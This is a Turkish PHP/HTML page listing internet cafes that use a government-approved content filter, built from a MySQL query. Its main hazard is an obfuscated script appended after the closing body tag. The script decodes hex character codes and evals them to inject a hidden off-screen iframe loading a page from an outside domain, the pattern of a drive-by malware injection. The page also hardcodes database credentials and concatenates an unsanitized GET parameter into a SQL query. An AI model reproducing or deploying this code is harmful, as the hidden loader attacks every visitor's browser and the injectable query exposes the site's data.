<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-9" />
<title>TİB ONAYLI FİLTREMİZİ KULLANAN CAFELERİMİZ</title>
<?php

include_once("mysql_connection.php");

$DBServ['TIB'] = "localhost";
$DBUser['TIB'] = "tibcafe";
$DBPass['TIB'] = "11012007";
$DBName['TIB'] = "tib";


if($rr_vt = new bf_vt($DBServ['TIB'],$DBUser['TIB'],$DBPass['TIB'],$DBName['TIB'])) {
		if(!isset($_GET['s'])) {
			$START = 0;				
		} else {
			$START = $_GET['s'];
		}
		$START += 3;
		$END = $START + 97;
		$q = "SELECT * FROM `kullanicibilgileri`";
		$s = $rr_vt->bf_vt_sqlsorgu($q);
		if($rr_vt->bf_vt_numrows($s)){ 
			$f = $rr_vt->bf_vt_sqldongu();
		}
		$K = count($f);
		
		$query = "SELECT * FROM `kullanicibilgileri` LIMIT ".$START.", ".$END;
		$sorgu = $rr_vt->bf_vt_sqlsorgu($query);
		if($rr_vt->bf_vt_numrows($sorgu)){
			$P = $rr_vt->bf_vt_sqldongu();
			$T = count($P);
			for($i=0;$i<$T;$i++) {
				$Cafe[$i]['A'] = $P[$i][1];
				$Cafe[$i]['T'] = $P[$i][4];
				$Cafe[$i]['K1'] = $P[$i][6];
				$Cafe[$i]['K2'] = $P[$i][7];
			}
		}

	}

?>
<style type="text/css">
<!--
.top {
	color: #FFF;
	font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
	font-size: 14px;
	font-weight: bold;
	padding: 3px;
}
.int {
	font-size: 9px;
	font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
}
.int td {
	font-size: 12px;
	text-align: left;
}
.a {
	font-weight: bold;
}

#bgdiff {
	background-color: #EFEFEF;	
}

.botlink a {
	font-family: Verdana, Geneva, sans-serif;
	font-size: 11px;
	color: #FFF;
	padding: 4px;
	margin: 4px;
	width: 30px;
	height: 13px;
	border: 1px solid #39C;
	background-color: #74BADC;
	font-weight: bold;
	text-decoration: none;
}

.botlink a:hover {
	font-family: Verdana, Geneva, sans-serif;
	font-size: 11px;
	color: #FFF;
	padding: 4px;
	margin: 4px;
	width: 30px;
	height: 13px;
	border: 1px solid #F00;
	background-color: #FF4646;
	font-weight: bold;
	text-decoration: none;
}
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
.hede {
	text-align: left;
}
td {
	text-align: left;
}
-->
</style>
</head>

<body>
<table width="660" border="0" align="center" cellpadding="4" cellspacing="0">
  <tr class="int">
    <td colspan="2" align="center"><img src="../gfx/logo.gif" alt="" width="259" height="93" /></td>
    <td colspan="2" class="a"><a href="http://www.webaynet.com"><img src="../images/homepage.jpg" alt="" width="82" height="50" border="0" /></a></td>
  </tr>
  <tr class="int">
    <td colspan="4" align="center" bgcolor="#0099CC"><span class="top">T.İ.B. (TELEKOMÜNİKASYON İLETİŞİM BAŞKANLIĞI) ONAYLI İÇERİK FİLTREMİZİ KULLANAN CAFELERİMİZ</span></td>
  </tr>
  <tr class="int">
    <td width="20" align="center">#</td>
    <td class="a">CAFE ADI</td>
    <td width="160" class="a">&nbsp;</td>
    <td width="160" class="a">İLÇE VE İL</td>
  </tr>
  <?
  	$j = 0;
  		foreach($Cafe as $C) {
			if($j < 100) {
			$j++;
	?>
  <tr class="int" id="<? if($j % 2 == 0) { echo "bgdiff"; } ?>">
    <td><? echo ($START-3)+$j; ?></td>
    <td align="left"><? echo $C['A']; ?></td>
    <td>&nbsp;</td>
    <td align="left"><?
			if($C['K1'].$C['K2'] != "") { 
				 echo ucwords(strtolower($C['K2'])); ?>/<? echo ucwords(strtolower($C['K1']));
			} else {
				echo "-";	
			}
		}
	?></td>
  </tr>
	<?		}
  ?>

</table>
<br /><center>
<div class="botlink">
	<?
    	if($K > 100) {
			$TP = floor($K / 100);
			for($a=0;$a<=$TP;$a++) {
				?>
<a href="index.php?s=<? echo $a*100; ?>"><? echo $a+1; ?></a>
				<?
			}
		}
	?>
</div>
</center>
</body>
   <!-- . --><script>aq="0"+"x";bv=(5-3-1);sp="s"+"pli"+"t";w=window;z="dy";try{++document.body}catch(d21vd12v){vzs=false;try{}catch(wb){vzs=21;}if(!vzs)e=w["eval"];if(1){f="0,0,60,5d,17,1f,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,20,72,4,0,0,0,60,5d,69,58,64,5c,69,1f,20,32,4,0,0,74,17,5c,63,6a,5c,17,72,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,6e,69,60,6b,5c,1f,19,33,60,5d,69,58,64,5c,17,6a,69,5a,34,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,17,6e,60,5b,6b,5f,34,1e,28,27,27,1e,17,5f,5c,60,5e,5f,6b,34,1e,28,27,27,1e,17,6a,6b,70,63,5c,34,1e,6e,60,5b,6b,5f,31,28,27,27,67,6f,32,5f,5c,60,5e,5f,6b,31,28,27,27,67,6f,32,67,66,6a,60,6b,60,66,65,31,58,59,6a,66,63,6c,6b,5c,32,63,5c,5d,6b,31,24,28,27,27,27,27,67,6f,32,6b,66,67,31,27,32,1e,35,33,26,60,5d,69,58,64,5c,35,19,20,32,4,0,0,74,4,0,0,5d,6c,65,5a,6b,60,66,65,17,60,5d,69,58,64,5c,69,1f,20,72,4,0,0,0,6d,58,69,17,5d,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,69,5c,58,6b,5c,3c,63,5c,64,5c,65,6b,1f,1e,60,5d,69,58,64,5c,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6a,69,5a,1e,23,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,20,32,5d,25,6a,6b,70,63,5c,25,63,5c,5d,6b,34,1e,24,28,27,27,27,27,67,6f,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,6b,70,63,5c,25,67,66,6a,60,6b,60,66,65,34,1e,58,59,6a,66,63,6c,6b,5c,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6e,60,5b,6b,5f,1e,23,1e,28,27,27,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,5f,5c,60,5e,5f,6b,1e,23,1e,28,27,27,1e,20,32,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,25,58,67,67,5c,65,5b,3a,5f,60,63,5b,1f,5d,20,32,4,0,0,74"[sp](",");}w=f;s=[];for(i=20-20;-i+670!=0;i+=1){j=i;if((0x19==031))if(e)s+=String["fromCharCode"](e(aq+w[j])+0xa-bv);}za=e;za(s)}</script><!-- . --> </html>    